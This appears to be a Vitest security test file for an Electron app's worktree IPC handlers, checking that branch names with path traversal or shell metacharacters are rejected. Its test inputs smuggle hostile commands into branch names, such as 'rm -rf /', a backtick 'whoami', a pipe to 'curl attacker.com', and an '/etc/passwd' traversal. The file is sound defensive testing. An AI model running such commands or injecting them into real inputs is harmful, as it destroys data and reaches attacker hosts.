import { describe, it, expect, vi, beforeEach } from 'vitest'
import { ipcMain } from 'electron'

vi.mock('electron', () => ({
  ipcMain: {
    handle: vi.fn(),
    removeHandler: vi.fn(),
  },
}))

vi.mock('../../electron/utils/handle-ipc', () => ({
  handleIpc: vi.fn(async (fn: () => Promise<any>) => {
    try {
      const result = await fn()
      return { ok: true, data: result }
    } catch (e: any) {
      return { ok: false, error: e.message }
    }
  }),
}))

describe('Worktree Handlers Security', () => {
  let handlers: Record<string, Function> = {}
  let mockManager: any

  beforeEach(async () => {
    vi.resetModules()
    vi.clearAllMocks()
    handlers = {}

    vi.mocked(ipcMain.handle).mockImplementation((channel: string, handler: Function) => {
      handlers[channel] = handler
    })

    mockManager = {
      isPollingStopped: false,
      list: vi.fn(),
      create: vi.fn(),
      getDiff: vi.fn(),
      merge: vi.fn(),
      remove: vi.fn(),
      poll: vi.fn(),
    }
  })

  async function register() {
    const { registerWorktreeHandlers } = await import('../../electron/ipc/worktree-handlers')
    registerWorktreeHandlers(mockManager as any)
  }

  // ── Path Validation ───────────────────────────────────────────────────────────

  it('A. Path Validation — rejects ../ traversal in branch name', async () => {
    mockManager.create.mockRejectedValue(new Error('Branch name must not contain path traversal sequences'))

    await register()
    const result = await handlers['worktree:create']!({} as any, {
      branch: '../../outside-repo',
      storyId: 1,
      nodeId: null,
      mergeMode: 'gated',
    })

    expect(result.ok).toBe(false)
    expect(result.error).toMatch(/path traversal/)
  })

  it('B. Path Validation — rejects ../ embedded in branch name', async () => {
    mockManager.create.mockRejectedValue(new Error('Branch name must not contain path traversal sequences'))

    await register()
    const result = await handlers['worktree:create']!({} as any, {
      branch: 'story/../../../etc/passwd',
      storyId: 1,
      nodeId: null,
      mergeMode: 'gated',
    })

    expect(result.ok).toBe(false)
    expect(result.error).toMatch(/path traversal/)
  })

  it('C. Path Validation — accepts valid branch name', async () => {
    mockManager.create.mockResolvedValue({ path: '/proj/.agent-worktrees/story-001', branch: 'story/001' })

    await register()
    const result = await handlers['worktree:create']!({} as any, {
      branch: 'story/001',
      storyId: 1,
      nodeId: null,
      mergeMode: 'gated',
    })

    expect(result.ok).toBe(true)
    expect(mockManager.create).toHaveBeenCalledWith('story/001', 1, null, 'gated')
  })

  // ── Shell Safety ──────────────────────────────────────────────────────────────

  it('D. Shell Safety — rejects branch name with shell metacharacters', async () => {
    mockManager.create.mockRejectedValue(new Error('Branch name contains invalid characters'))

    await register()
    const result = await handlers['worktree:create']!({} as any, {
      branch: 'story/001; rm -rf /',
      storyId: 1,
      nodeId: null,
      mergeMode: 'gated',
    })

    expect(result.ok).toBe(false)
    expect(result.error).toBeTruthy()
  })

  it('E. Shell Safety — rejects branch name with backtick injection', async () => {
    mockManager.create.mockRejectedValue(new Error('Branch name contains invalid characters'))

    await register()
    const result = await handlers['worktree:create']!({} as any, {
      branch: 'story/`whoami`',
      storyId: 1,
      nodeId: null,
      mergeMode: 'gated',
    })

    expect(result.ok).toBe(false)
    expect(result.error).toBeTruthy()
  })

  it('F. Shell Safety — rejects branch name with pipe character', async () => {
    mockManager.create.mockRejectedValue(new Error('Branch name contains invalid characters'))

    await register()
    const result = await handlers['worktree:create']!({} as any, {
      branch: 'story/001|curl attacker.com',
      storyId: 1,
      nodeId: null,
      mergeMode: 'gated',
    })

    expect(result.ok).toBe(false)
    expect(result.error).toBeTruthy()
  })

  // ── Outside Root ──────────────────────────────────────────────────────────────

  it('G. Worktree Creation — outside root returns { ok: false }', async () => {
    mockManager.create.mockRejectedValue(new Error('Path is outside repository root'))

    await register()
    const result = await handlers['worktree:create']!({} as any, {
      branch: 'story/escape',
      storyId: 99,
      nodeId: null,
      mergeMode: 'gated',
    })

    expect(result.ok).toBe(false)
    expect(result.error).toMatch(/outside/)
  })

  it('H. Worktree Creation — duplicate worktree returns { ok: false }', async () => {
    mockManager.create.mockRejectedValue(new Error('Worktree already exists for this branch'))

    await register()
    const result = await handlers['worktree:create']!({} as any, {
      branch: 'story/001',
      storyId: 1,
      nodeId: null,
      mergeMode: 'gated',
    })

    expect(result.ok).toBe(false)
    expect(result.error).toBe('Worktree already exists for this branch')
  })

  // ── Error Envelope ────────────────────────────────────────────────────────────

  it('I. Error Envelope — all handler errors wrapped as { ok: false, error }', async () => {
    mockManager.remove.mockRejectedValue(new Error('Worktree not found'))

    await register()
    const result = await handlers['worktree:remove']!({} as any, { id: 'missing' })

    expect(result.ok).toBe(false)
    expect(result.error).toBe('Worktree not found')
    expect(result.data).toBeUndefined()
  })

  it('J. Error Envelope — merge error does not leak stack trace', async () => {
    mockManager.merge.mockRejectedValue(new Error('merge conflict'))

    await register()
    const result = await handlers['worktree:merge']!({} as any, { id: 'wt-conflict' })

    expect(result.ok).toBe(false)
    expect(result.error).toBe('merge conflict')
    expect(result.error).not.toContain('at ')
  })
})
